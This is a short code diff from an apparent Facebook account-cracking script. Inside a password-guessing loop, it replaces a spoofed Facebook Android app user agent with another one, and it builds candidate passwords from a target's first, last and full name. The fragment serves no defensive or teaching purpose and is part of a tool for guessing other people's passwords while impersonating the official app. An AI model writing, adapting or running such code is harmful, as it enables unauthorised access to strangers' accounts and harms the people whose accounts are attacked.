@@ -267,7 +267,7 @@ def method():
 
         for pswd in pp:
 
-              heads= ('Davik/2.1.0 (Linux; U; Android 8.0.1; GT-N8000 Build/TP1A.220905.001) [FBAN/FB4A;FBAV/379.0.0.25.74;FBBV/17508060;FBDM/{density=2.0,width=1080,height=1440};FBLC/en_PK;FBRV/11782876;FBCR/BASE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-N8000;FBSV/7.5.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]')#Put Your user Agent Here
+              heads= ('Davik/2.1.0 (Linux; U; Android 10; SM-A500F Build/TP1A.220905.001) [FBAN/FB4A;FBAV/124.0.0.17.53;FBBV/22195234;FBDM/{density=1.5,width=1080,height=1920};FBLC/en_PK;FBRV/30696749;FBCR/DOCTYPE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500F;FBSV/4.2.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]')#Put Your user Agent Here
 
               pswd = pswd.replace(f'first',first.lower()).replace(f'First',first).replace(f'last',last.lower()).replace(f'Last',last).replace(f'Name',name).replace(f'name',name.lower())
 
